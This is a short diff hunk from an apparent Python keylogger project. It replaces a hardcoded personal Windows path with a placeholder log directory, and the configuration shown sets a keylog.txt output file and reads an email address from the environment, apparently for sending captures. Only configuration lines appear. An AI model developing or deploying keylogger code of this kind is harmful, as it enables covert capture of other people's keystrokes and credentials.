@@ -11,7 +11,7 @@ import atexit
 import threading
 
 # Configuration
-LOG_DIR = r"C:\Users\prady\OneDrive\Desktop\projects\keylogger"
+LOG_DIR = r"# PATH OF THE DIRECTORY WHERE YOU WANT TO STORE YOUR KEYLOG'D CAPTURES"
 LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
 EMAIL_ADDRESS = os.environ.get(
     "EMAIL_ADDRESS"
